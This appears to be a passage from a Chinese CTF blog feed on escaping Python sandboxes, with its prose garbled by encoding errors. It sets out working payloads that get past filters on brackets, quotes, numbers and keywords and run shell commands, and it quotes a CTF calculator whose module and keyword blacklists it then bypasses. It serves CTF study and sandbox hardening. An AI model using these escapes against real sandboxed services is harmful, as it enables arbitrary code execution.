<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[].append.__class__.__call__(<span class="built_in">eval</span>, <span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="waf"><a class="markdownIt-Anchor" href="#waf"></a> WAF</h2>
<h3 id="è¿‡æ»¤"><a class="markdownIt-Anchor" href="#è¿‡æ»¤"></a> è¿‡æ»¤ [ ]</h3>
<p>åº”å¯¹çš„æ–¹å¼å°±æ˜¯å°†<code>[]</code>çš„åŠŸèƒ½ç”¨<code>pop</code>ã€<code>__getitem__</code> ä»£æ›¿ï¼ˆå®é™…ä¸Š<code>a[0]</code>å°±æ˜¯åœ¨å†…éƒ¨è°ƒç”¨äº†<code>a.__getitem__(0)</code>ï¼‰ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">59</span>).__init__.func_globals.get(<span class="string">&#x27;linecache&#x27;</span>).os.popen(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br><span class="line"><span class="string">&#x27;macr0phag3\n&#x27;</span></span><br></pre></td></tr></table></figure>
<p>å½“ç„¶ï¼Œdict ä¹Ÿæ˜¯å¯ä»¥ pop çš„ï¼š<code>&#123;&quot;a&quot;: 1&#125;.pop(&quot;a&quot;)</code></p>
<p>å½“ç„¶ä¹Ÿå¯ä»¥ç”¨ <code>next(iter())</code> æ›¿ä»£ï¼Œæˆ–è®¸å¯ä»¥åŠ ä¸Š <code>max</code> ä¹‹ç±»çš„ç©æ„ã€‚</p>
<h3 id="è¿‡æ»¤å¼•å·"><a class="markdownIt-Anchor" href="#è¿‡æ»¤å¼•å·"></a> è¿‡æ»¤å¼•å·</h3>
<blockquote>
<p>chr</p>
</blockquote>
<p>æœ€ç®€å•å°±æ˜¯ç”¨ <code>chr</code> å•¦</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">os.system(</span><br><span class="line">    <span class="built_in">chr</span>(<span class="number">119</span>)+<span class="built_in">chr</span>(<span class="number">104</span>)+<span class="built_in">chr</span>(<span class="number">111</span>)+<span class="built_in">chr</span>(<span class="number">97</span>)+<span class="built_in">chr</span>(<span class="number">109</span>)+<span class="built_in">chr</span>(<span class="number">105</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>æ‰£å­—ç¬¦</p>
</blockquote>
<p>åˆ©ç”¨ <code>str</code> å’Œ <code>[]</code>ï¼ŒæŒ¨ä¸ªæŠŠå­—ç¬¦æ‹¼æ¥å‡ºæ¥</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">os.system(</span><br><span class="line">    <span class="built_in">str</span>(().__class__.__new__)[<span class="number">21</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">13</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">14</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">40</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">10</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">3</span>]</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>å½“ç„¶ <code>[]</code> å¦‚æœè¢«è¿‡æ»¤äº†ä¹Ÿå¯ä»¥ bypassï¼Œå‰é¢è¯´è¿‡äº†ã€‚</p>
<p>å¦‚æœ str è¢«è¿‡æ»¤äº†æ€ä¹ˆåŠå‘¢ï¼Ÿ<code>type('')()</code>ã€<code>format()</code> å³å¯ã€‚åŒç†ï¼Œ<code>int</code>ã€<code>list</code> éƒ½å¯ä»¥ç”¨ <code>type</code> æ„é€ å‡ºæ¥ã€‚</p>
<blockquote>
<p>æ ¼å¼åŒ–å­—ç¬¦ä¸²</p>
</blockquote>
<p>é‚£è¿‡æ»¤äº†å¼•å·ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²è¿˜èƒ½ç”¨å—ï¼Ÿ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(<span class="built_in">chr</span>(<span class="number">37</span>)+<span class="built_in">str</span>(&#123;&#125;.__class__)[<span class="number">1</span>])%<span class="number">100</span> == <span class="string">&#x27;d&#x27;</span></span><br></pre></td></tr></table></figure>
<p>åˆèµ·é£äº†â€¦</p>
<blockquote>
<p>dict() æ‹¿é”®å®ƒä¸é¦™å—ï¼Ÿ</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;whoami&#x27;</span> ==</span><br><span class="line"><span class="built_in">list</span>(<span class="built_in">dict</span>(whoami=<span class="number">1</span>))[<span class="number">0</span>] ==</span><br><span class="line"><span class="built_in">str</span>(<span class="built_in">dict</span>(whoami=<span class="number">1</span>))[<span class="number">2</span>:<span class="number">8</span>] ==</span><br></pre></td></tr></table></figure>
<h3 id="é™åˆ¶æ•°å­—"><a class="markdownIt-Anchor" href="#é™åˆ¶æ•°å­—"></a> é™åˆ¶æ•°å­—</h3>
<p>ä¸Šé¢æåˆ°äº†å­—ç¬¦ä¸²è¿‡æ»¤ç»•è¿‡ï¼Œé¡ºä¾¿è¯´ä¸€ä¸‹ï¼Œå¦‚æœæ˜¯è¿‡æ»¤äº†æ•°å­—ï¼ˆè™½ç„¶è¿™ç§æƒ…å†µå¾ˆå°‘è§ï¼‰ï¼Œé‚£ç»•è¿‡çš„æ–¹å¼å°±æ›´å¤šäº†ï¼Œæˆ‘è¿™é‡Œéšä¾¿åˆ—ä¸‹ï¼š</p>
<ol>
<li>0ï¼š<code>int(bool([]))</code>ã€<code>Flase</code>ã€<code>len([])</code>ã€<code>any(())</code></li>
<li>1ï¼š<code>int(bool([&quot;&quot;]))</code>ã€<code>True</code>ã€<code>all(())</code>ã€<code>int(list(list(dict(aá=())).pop()).pop())</code></li>
<li>è·å–ç¨å¾®å¤§çš„æ•°å­—ï¼š<code>len(str(&#123;&#125;.keys))</code>ï¼Œä¸è¿‡éœ€è¦æ…¢æ…¢æ‰¾é•¿åº¦ç¬¦åˆçš„å­—ç¬¦ä¸²</li>
<li>1.0ï¼š<code>float(True)</code></li>
<li>-1ï¼š<code>~0</code></li>
<li>â€¦</li>
</ol>
<p>å…¶å®æœ‰äº† <code>0</code> å°±å¯ä»¥äº†ï¼Œè¦å•¥æ•´æ•°ç›´æ¥åšè¿ç®—å³å¯ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span> ** <span class="number">0</span> == <span class="number">1</span></span><br><span class="line"><span class="number">1</span> + <span class="number">1</span> == <span class="number">2</span></span><br><span class="line"><span class="number">2</span> + <span class="number">1</span> == <span class="number">3</span></span><br><span class="line"><span class="number">2</span> ** <span class="number">2</span> == <span class="number">4</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>ä»»æ„æµ®ç‚¹æ•°ç¨å¾®éº»çƒ¦ç‚¹ï¼Œéœ€è¦æƒ³åŠæ³•è¿ç®—ï¼Œä½†æ˜¯ä¸€å®šå¯ä»¥æå‡ºæ¥ï¼Œé™¤éæ˜¯ Ï€ è¿™ç§ç©æ„â€¦</p>
<h3 id="é™åˆ¶ç©ºæ ¼"><a class="markdownIt-Anchor" href="#é™åˆ¶ç©ºæ ¼"></a> é™åˆ¶ç©ºæ ¼</h3>
<p>ç©ºæ ¼é€šå¸¸æ¥è¯´å¯ä»¥é€šè¿‡ <code>()</code>ã€<code>[]</code> æ›¿æ¢æ‰ã€‚ä¾‹å¦‚ï¼š</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="selector-attr">[i for i in range(10) if i == 5]</span>` å¯ä»¥æ›¿æ¢ä¸º `<span class="selector-attr">[[i]</span><span class="selector-attr">[0]</span><span class="built_in">for</span>(i)<span class="built_in">in</span>(<span class="built_in">range</span>(<span class="number">10</span>))<span class="built_in">if</span>(i)==<span class="number">5</span>]</span><br></pre></td></tr></table></figure>
<h3 id="é™åˆ¶è¿ç®—ç¬¦"><a class="markdownIt-Anchor" href="#é™åˆ¶è¿ç®—ç¬¦"></a> é™åˆ¶è¿ç®—ç¬¦</h3>
<p><code>&gt; &lt; ! - +</code> è¿™å‡ ä¸ªæ¯”è¾ƒç®€å•å°±ä¸è¯´äº†ã€‚</p>
<p><code>==</code> å¯ä»¥ç”¨ <code>in</code> æ¥æ›¿æ¢ã€‚</p>
<p>æ›¿æ¢ <code>or</code> çš„æµ‹è¯•ä»£ç </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> [(<span class="number">100</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">1</span>), (<span class="number">100</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>), (<span class="number">100</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">2</span>), (<span class="number">100</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>)]:</span><br><span class="line">    ans = i[<span class="number">0</span>]==i[<span class="number">1</span>] <span class="keyword">or</span> i[<span class="number">2</span>]==i[<span class="number">3</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bool</span>(<span class="built_in">eval</span>(<span class="string">f&#x27;<span class="subst">&#123;i[<span class="number">0</span>]==i[<span class="number">1</span>]&#125;</span> | <span class="subst">&#123;i[<span class="number">2</span>]==i[<span class="number">3</span>]&#125;</span>&#x27;</span>)) == ans)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bool</span>(<span class="built_in">eval</span>(<span class="string">f&#x27;- <span class="subst">&#123;i[<span class="number">0</span>]==i[<span class="number">1</span>]&#125;</span> - <span class="subst">&#123;i[<span class="number">2</span>]==i[<span class="number">3</span>]&#125;</span>&#x27;</span>)) == ans)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bool</span>(<span class="built_in">eval</span>(<span class="string">f&#x27;<span class="subst">&#123;i[<span class="number">0</span>]==i[<span class="number">1</span>]&#125;</span> + <span class="subst">&#123;i[<span class="number">2</span>]==i[<span class="number">3</span>]&#125;</span>&#x27;</span>)) == ans)</span><br></pre></td></tr></table></figure>
<p>ä¸Šé¢è¿™å‡ ä¸ªè¡¨è¾¾å¼éƒ½å¯ä»¥æ›¿æ¢æ‰ <code>or</code></p>
<p>æ›¿æ¢ <code>and</code> çš„æµ‹è¯•ä»£ç </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> [(<span class="number">100</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">1</span>), (<span class="number">100</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>), (<span class="number">100</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">2</span>), (<span class="number">100</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>)]:</span><br><span class="line">    ans = i[<span class="number">0</span>]==i[<span class="number">1</span>] <span class="keyword">and</span> i[<span class="number">2</span>]==i[<span class="number">3</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bool</span>(<span class="built_in">eval</span>(<span class="string">f&#x27;<span class="subst">&#123;i[<span class="number">0</span>]==i[<span class="number">1</span>]&#125;</span> &amp; <span class="subst">&#123;i[<span class="number">2</span>]==i[<span class="number">3</span>]&#125;</span>&#x27;</span>)) == ans)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bool</span>(<span class="built_in">eval</span>(<span class="string">f&#x27;<span class="subst">&#123;i[<span class="number">0</span>]==i[<span class="number">1</span>]&#125;</span> * <span class="subst">&#123;i[<span class="number">2</span>]==i[<span class="number">3</span>]&#125;</span>&#x27;</span>)) == ans)</span><br></pre></td></tr></table></figure>
<p>ä¸Šé¢è¿™å‡ ä¸ªè¡¨è¾¾å¼éƒ½å¯ä»¥æ›¿æ¢æ‰ <code>and</code></p>
<h3 id="é™åˆ¶"><a class="markdownIt-Anchor" href="#é™åˆ¶"></a> é™åˆ¶ ( )</h3>
<p>è¿™ç§æƒ…å†µä¸‹é€šå¸¸éœ€è¦èƒ½å¤Ÿæ”¯æŒ exec æ‰§è¡Œä»£ç ã€‚å› ä¸ºæœ‰ä¸¤ç§å§¿åŠ¿ï¼š</p>
<ul>
<li>åˆ©ç”¨è£…é¥°å™¨ <code>@</code></li>
<li>åˆ©ç”¨é­”æœ¯æ–¹æ³•ï¼Œä¾‹å¦‚ <code>enum.EnumMeta.__getitem__</code>ï¼Œ</li>
</ul>
<h3 id="åˆ©ç”¨æ–°ç‰¹æ€§"><a class="markdownIt-Anchor" href="#åˆ©ç”¨æ–°ç‰¹æ€§"></a> åˆ©ç”¨æ–°ç‰¹æ€§</h3>
<p>PEP 498 å¼•å…¥äº† <code>f-string</code>ï¼Œåœ¨ 3.6 å¼€å§‹å‡ºç°ï¼š<a href="https://docs.python.org/3.6/whatsnew/3.6.html#new-features">ä¼ é€é—¨ğŸšª</a>ï¼Œé£Ÿç”¨æ–¹å¼ï¼š<a href="https://docs.python.org/3.6/reference/lexical_analysis.html#f-strings">ä¼ é€é—¨ğŸšª</a>ã€‚æ‰€ä»¥æˆ‘ä»¬å°±æœ‰äº†ä¸€ç§èˆ¹æ–°çš„åˆ©ç”¨æ–¹å¼ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;whoami&quot;</span>)&#125;</span>&#x27;</span></span><br><span class="line">macr0phag3</span><br><span class="line"><span class="string">&#x27;0&#x27;</span></span><br></pre></td></tr></table></figure>
<p>å…³æ³¨æ¯æ¬¡ç‰ˆæœ¬å¢åŠ çš„æ–°ç‰¹æ€§ï¼Œæˆ–è®¸èƒ½æ·˜åˆ°ç‚¹å®è´ã€‚</p>
<h3 id="åˆ©ç”¨ååºåˆ—åŒ–æ”»å‡»"><a class="markdownIt-Anchor" href="#åˆ©ç”¨ååºåˆ—åŒ–æ”»å‡»"></a> åˆ©ç”¨ååºåˆ—åŒ–æ”»å‡»</h3>
<p>ååºåˆ—åŒ–æ”»å‡»ä¹Ÿæ˜¯èƒ½ç”¨æ¥é€ƒé€¸</p>
<p>è¿™ä¸ªä¾‹å­æ¥è‡ª<code>iscc 2016</code>çš„<code>Pwn300 pycalc</code>ï¼Œç›¸å½“æœ‰è¶£ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">banner</span>():</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;=============================================&quot;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;   Simple calculator implemented by python   &quot;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;=============================================&quot;</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getexp</span>():</span><br><span class="line">    <span class="keyword">return</span> raw_input(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_hook_import_</span>(<span class="params">name, *args, **kwargs</span>):</span><br><span class="line">    module_blacklist = [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;time&#x27;</span>, <span class="string">&#x27;bdb&#x27;</span>, <span class="string">&#x27;bsddb&#x27;</span>, <span class="string">&#x27;cgi&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;CGIHTTPServer&#x27;</span>, <span class="string">&#x27;cgitb&#x27;</span>, <span class="string">&#x27;compileall&#x27;</span>, <span class="string">&#x27;ctypes&#x27;</span>, <span class="string">&#x27;dircache&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;doctest&#x27;</span>, <span class="string">&#x27;dumbdbm&#x27;</span>, <span class="string">&#x27;filecmp&#x27;</span>, <span class="string">&#x27;fileinput&#x27;</span>, <span class="string">&#x27;ftplib&#x27;</span>, <span class="string">&#x27;gzip&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;getopt&#x27;</span>, <span class="string">&#x27;getpass&#x27;</span>, <span class="string">&#x27;gettext&#x27;</span>, <span class="string">&#x27;httplib&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;imputil&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;linecache&#x27;</span>, <span class="string">&#x27;macpath&#x27;</span>, <span class="string">&#x27;mailbox&#x27;</span>, <span class="string">&#x27;mailcap&#x27;</span>, <span class="string">&#x27;mhlib&#x27;</span>, <span class="string">&#x27;mimetools&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;mimetypes&#x27;</span>, <span class="string">&#x27;modulefinder&#x27;</span>, <span class="string">&#x27;multiprocessing&#x27;</span>, <span class="string">&#x27;netrc&#x27;</span>, <span class="string">&#x27;new&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;optparse&#x27;</span>, <span class="string">&#x27;pdb&#x27;</span>, <span class="string">&#x27;pipes&#x27;</span>, <span class="string">&#x27;pkgutil&#x27;</span>, <span class="string">&#x27;platform&#x27;</span>, <span class="string">&#x27;popen2&#x27;</span>, <span class="string">&#x27;poplib&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;posix&#x27;</span>, <span class="string">&#x27;posixfile&#x27;</span>, <span class="string">&#x27;profile&#x27;</span>, <span class="string">&#x27;pstats&#x27;</span>, <span class="string">&#x27;pty&#x27;</span>, <span class="string">&#x27;py_compile&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;pyclbr&#x27;</span>, <span class="string">&#x27;pydoc&#x27;</span>, <span class="string">&#x27;rexec&#x27;</span>, <span class="string">&#x27;runpy&#x27;</span>, <span class="string">&#x27;shlex&#x27;</span>, <span class="string">&#x27;shutil&#x27;</span>, <span class="string">&#x27;SimpleHTTPServer&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;SimpleXMLRPCServer&#x27;</span>, <span class="string">&#x27;site&#x27;</span>, <span class="string">&#x27;smtpd&#x27;</span>, <span class="string">&#x27;socket&#x27;</span>, <span class="string">&#x27;SocketServer&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;sysconfig&#x27;</span>, <span class="string">&#x27;tabnanny&#x27;</span>, <span class="string">&#x27;tarfile&#x27;</span>, <span class="string">&#x27;telnetlib&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;tempfile&#x27;</span>, <span class="string">&#x27;Tix&#x27;</span>, <span class="string">&#x27;trace&#x27;</span>, <span class="string">&#x27;turtle&#x27;</span>, <span class="string">&#x27;urllib&#x27;</span>, <span class="string">&#x27;urllib2&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;uu&#x27;</span>, <span class="string">&#x27;webbrowser&#x27;</span>, <span class="string">&#x27;whichdb&#x27;</span>, <span class="string">&#x27;zipfile&#x27;</span>, <span class="string">&#x27;zipimport&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> forbid <span class="keyword">in</span> module_blacklist:</span><br><span class="line">        <span class="keyword">if</span> name == forbid:        <span class="comment"># don&#x27;t let user import these modules</span></span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;No you can\&#x27; import &#123;0&#125;!!!&#x27;</span>.<span class="built_in">format</span>(forbid))</span><br><span class="line">    <span class="comment"># normal modules can be imported</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">__import__</span>(name, *args, **kwargs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sandbox_filter</span>(<span class="params">command</span>):</span><br><span class="line">    blacklist = [<span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;__getitem__&#x27;</span>, <span class="string">&#x27;__setitem__&#x27;</span>,</span><br><span class="line">                 <span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;read&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;os&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> forbid <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> forbid <span class="keyword">in</span> command:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sandbox_exec</span>(<span class="params">command</span>):      <span class="comment"># sandbox user input</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    __sandboxed_builtins__ = <span class="built_in">dict</span>(__builtins__.__dict__)</span><br><span class="line">    __sandboxed_builtins__[<span class="string">&#x27;__import__&#x27;</span>] = _hook_import_    <span class="comment"># hook import</span></span><br><span class="line">    <span class="keyword">del</span> __sandboxed_builtins__[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">    _<span class="keyword">global</span> = &#123;</span><br><span class="line">        <span class="string">&#x27;__builtins__&#x27;</span>: __sandboxed_builtins__</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> sandbox_filter(command) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Malicious user input detected!!!&#x27;</span></span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    command = <span class="string">&#x27;result = &#x27;</span> + command</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">exec</span> command <span class="keyword">in</span> _<span class="keyword">global</span>     <span class="comment"># do calculate in a sandboxed environment</span></span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="built_in">print</span> e</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    result = _<span class="keyword">global</span>[<span class="string">&#x27;result&#x27;</span>]  <span class="comment"># extract the result</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">banner()</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    command = getexp()</span><br><span class="line">    <span class="built_in">print</span> sandbox_exec(command)</span><br></pre></td></tr></table></figure>
<p><code>exec command in _global</code> è¿™ä¸€å¥å°±æŠŠå¾ˆå¤š payload å¹²æ‰äº†ï¼Œç”±äº exec è¿è¡Œåœ¨è‡ªå®šä¹‰çš„å…¨å±€å‘½åç©ºé—´é‡Œï¼Œè¿™æ—¶å€™ä¼šå¤„äº<code>restricted execution mode</code>ã€‚exec åŠ ä¸Šå®šåˆ¶çš„ globals ä¼šä½¿å¾—æ²™ç®±å®‰å…¨å¾ˆå¤šï¼Œä¸€äº›å¸¸è§„çš„ payload æ˜¯æ²¡æ³•ä½¿ç”¨çš„ï¼Œä¾‹å¦‚ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()[<span class="number">71</span>]._Printer__setup.__globals__</span><br><span class="line">restricted attribute</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">getattr</span>(<span class="built_in">getattr</span>(<span class="built_in">__import__</span>(<span class="string">&#x27;types&#x27;</span>), <span class="string">&#x27;FileType&#x27;</span>)(<span class="string">&#x27;key&#x27;</span>), <span class="string">&#x27;re&#x27;</span><span class="string">&#x27;ad&#x27;</span>)()</span><br><span class="line">file() constructor <span class="keyword">not</span> accessible <span class="keyword">in</span> restricted mode</span><br><span class="line"></span><br><span class="line">DELPHI</span><br></pre></td></tr></table></figure>
<p>ä¸è¿‡ä¹Ÿæ­£æ˜¯ç”±äº exec è¿è¡Œåœ¨ç‰¹å®šçš„å‘½åç©ºé—´é‡Œï¼Œå¯ä»¥é€šè¿‡å…¶ä»–å‘½åç©ºé—´é‡Œçš„ <code>__builtins__</code>ï¼Œæ¯”å¦‚ types åº“ï¼Œæ¥æ‰§è¡Œä»»æ„å‘½ä»¤ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">getattr</span>(<span class="built_in">__import__</span>(<span class="string">&#x27;types&#x27;</span>).__builtins__[<span class="string">&#x27;__tropmi__&#x27;</span>[::-<span class="number">1</span>]](<span class="string">&#x27;so&#x27;</span>[::-<span class="number">1</span>]), <span class="string">&#x27;mets&#x27;</span> <span class="string">&#x27;ys&#x27;</span>[::-<span class="number">1</span>])(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">macr0phag3</span><br><span class="line"></span><br><span class="line">LISP</span><br></pre></td></tr></table></figure>
<h3 id="æç«¯é™åˆ¶"><a class="markdownIt-Anchor" href="#æç«¯é™åˆ¶"></a> æç«¯é™åˆ¶</h3>
<p>è¿™ç§é™åˆ¶ä¸€èˆ¬æ˜¯ç»„åˆå½¢å¼å‡ºç°ï¼Œè€Œä¸”é€šå¸¸åªä¼šå‡ºç°åœ¨ CTF ä¸­ã€‚</p>
<blockquote>
<p>é™åˆ¶è¾“å…¥å­—ç¬¦çš„é›†åˆçš„å¤§å°</p>
</blockquote>
<p>æ€è·¯å°±æ˜¯å…ˆç¡®å®šä¸å¾—ä¸ç”¨åˆ°çš„å­—ç¬¦ï¼Œå†çœ‹è¿™äº›å­—ç¬¦èƒ½å¤Ÿæ‹¼å‡ºå“ªäº›å‡½æ•°æˆ–è€…å¸¸é‡ã€‚</p>
<blockquote>
<p>é™åˆ¶ä¸èƒ½ä½¿ç”¨ <code>[a-zA-Z]</code> çš„å­—ç¬¦</p>
</blockquote>
<p>Python3 æ”¯æŒäº† Unicode å˜é‡åä¸”è§£é‡Šå™¨åœ¨åšä»£ç è§£æçš„æ—¶å€™ï¼Œä¼šå¯¹å˜é‡åè¿›è¡Œè§„èŒƒåŒ–ï¼Œç®—æ³•æ˜¯ <code>NFKC</code>ã€‚</p>
<p>æ‰€ä»¥åœ¨è¿™ç§æƒ…å†µä¸‹å¯ä»¥ç”¨è¿™ç§å§¿åŠ¿ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">eval</span> == áµ‰val</span><br></pre></td></tr></table></figure>
<blockquote>
<p>socket + ä¸¥æ ¼çš„è¾“å…¥é™åˆ¶</p>
</blockquote>
<p>å¯ä»¥çœ‹çœ‹æ˜¯å¦æ¼æ‰äº† <code>help</code>ï¼Œæ¼æ‰çš„è¯ï¼Œå…ˆé€šè¿‡ <code>help()</code> è°ƒèµ· vi/vimï¼Œç„¶åç”¨ <code>!</code> æŒ‡ä»¤å³å¯ getshell</p>
<h2 id="å‚è€ƒé“¾æ¥"><a class="markdownIt-Anchor" href="#å‚è€ƒé“¾æ¥"></a> å‚è€ƒé“¾æ¥</h2>
<blockquote>
<p><a href="https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/">https://www.tr0y.wang/2019/05/06/Pythonæ²™ç®±é€ƒé€¸ç»éªŒæ€»ç»“/</a></p>
<p><a href="https://hosch3n.github.io/2020/08/27/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">https://hosch3n.github.io/2020/08/27/Pythonæ²™ç®±é€ƒé€¸/</a></p>
</blockquote>
<p>å£°æ˜ï¼šæœ¬æ–‡ä¸åšä»»ä½•å•†ç”¨ï¼Œä»…å±•ç¤ºè‡ªå·±çš„blogä¸Šæ–¹ä¾¿è‡ªæˆ‘æŸ¥é˜…ï¼Œè‹¥å­˜åœ¨<strong>æŠ„è¢­ï¼Œæ¬è¿å•†ç”¨</strong>ï¼Œè¯·åŠæ—¶è”ç³»æœ¬äººåˆ é™¤ï¼Œå‘é€é‚®ç®±ï¼</p>
]]></content>
      <categories>
        <category>æŠ€æœ¯å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>pyjail</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>è¥¿æ¹–è®ºå‰‘2022éƒ¨åˆ†WriteupåŠå¤ç°</title>
    <url>/2023/02/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>è¿™æ¬¡è¥¿æ¹–çš„é¢˜é‡å¯¹äºäººæ•°è¾ƒå°‘çš„é˜Ÿä¼æ¥è¯´è¿˜æ˜¯è›®å¤šçš„ï¼Œæ„Ÿè§‰é¢˜ç›®è›®é­”å¹»çš„ï¼Œåšå‡ºæ¥å°±æ„Ÿè§‰æ˜¯éé¢„æœŸå‡ºçš„ï¼ˆé‡å­æ€è¥¿æ¹–ï¼‰æ¯”èµ›bançš„æŒºä¸¥çš„è¯´ï¼Œä¸è¿‡æ”¶è·è¿˜æ˜¯è›®å¤§çš„ï¼Œä¹Ÿç»™é˜Ÿä¼å‡ºäº†ä¸å°‘åŠ›ï¼Œç´¯æŒº~~</p>
<span id="more"></span>
<h1 id="web"><a class="markdownIt-Anchor" href="#web"></a> #Web</h1>
